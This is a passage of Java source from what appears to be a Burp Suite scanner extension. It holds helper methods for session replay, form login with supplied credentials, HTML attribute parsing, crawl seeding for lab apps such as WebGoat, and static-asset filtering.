            if (session.has()) req = req.withHeader("Cookie", session.cookieHeader());
            return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
        } catch (Exception e) {
            return null;
        }
    }

    /** A protected URL to verify the session against — prefers a /bank/ page from the site map. */
    private String firstProtectedUrl(String host) {
        for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
            String u = rr.request().url();
            if (!host.equalsIgnoreCase(hostOf(u))) continue;
            int q = u.indexOf('?'); String bare = q < 0 ? u : u.substring(0, q);
            if (bare.toLowerCase().contains("/bank/") && !AuthenticatedExplorer.LOGOUT.matcher(bare).matches()) {
                return bare;
            }
        }
        return null;
    }

    private HttpRequestResponse postForm(String url, HttpService svc, Map<String, String> fields,
                                         String userField, String user, String passField, String pass,
                                         String cookie) {
        StringBuilder body = new StringBuilder();
        for (Map.Entry<String, String> e : fields.entrySet()) {
            String v = e.getValue();
            if (e.getKey().equals(userField)) v = user;
            else if (e.getKey().equals(passField)) v = pass;
            if (body.length() > 0) body.append('&');
            body.append(URLEncoder.encode(e.getKey(), StandardCharsets.UTF_8))
                .append('=').append(URLEncoder.encode(v, StandardCharsets.UTF_8));
        }
        HttpRequest req = HttpRequest.httpRequestFromUrl(url)
                .withMethod("POST")
                .withAddedHeader("Content-Type", "application/x-www-form-urlencoded")
                .withBody(body.toString());
        if (req.httpService() == null && svc != null) req = req.withService(svc);
        if (cookie != null && !cookie.isBlank()) req = req.withHeader("Cookie", cookie);
        return api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
    }

    private static String attr(String tag, String name) {
        Matcher m = Pattern.compile("(?is)\\b" + Pattern.quote(name)
                + "\\s*=\\s*(\"([^\"]*)\"|'([^']*)'|([^\\s>]+))").matcher(tag);
        if (!m.find()) return null;
        if (m.group(2) != null) return m.group(2);
        if (m.group(3) != null) return m.group(3);
        return m.group(4);
    }

    private static String hostSeed(HttpRequestResponse rr) {
        try {
            URI u = URI.create(rr.request().url());
            String base = u.getScheme() + "://" + u.getHost();
            if (u.getPort() != -1) base += ":" + u.getPort();
            // PRESERVE the selected request's path as the crawl seed. Rooting to "/" made apps served under a
            // base path (WebGoat at /WebGoat/, some labs under /app/, /api/…) get seeded at the bare host, whose
            // landing has no app surface → 0 findings. Seeding at the request's path (query stripped) starts the
            // crawl inside the app; scope stays host-wide (see restrictScopeToTarget) so siblings are still reached.
            String path = u.getRawPath();
            if (path == null || path.isEmpty()) path = "/";
            return base + path;
        } catch (Exception e) {
            return null;
        }
    }

    private static String hostOf(String url) { return Net.authority(url); }

    private static String trunc(String s, int n) {
        if (s == null) return "";
        return s.length() <= n ? s : s.substring(0, n) + "…";
    }

    private static boolean hasPasswordParam(HttpRequest req) {
        if (!req.hasParameters()) return false;
        for (ParsedHttpParameter p : req.parameters()) {
            if (PASS_PARAM.matcher(p.name()).matches()) return true;
        }
        return false;
    }

    private static boolean isStaticAsset(String path) {
        return path != null && path.toLowerCase()
                .matches(".*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf)$");
    }
}
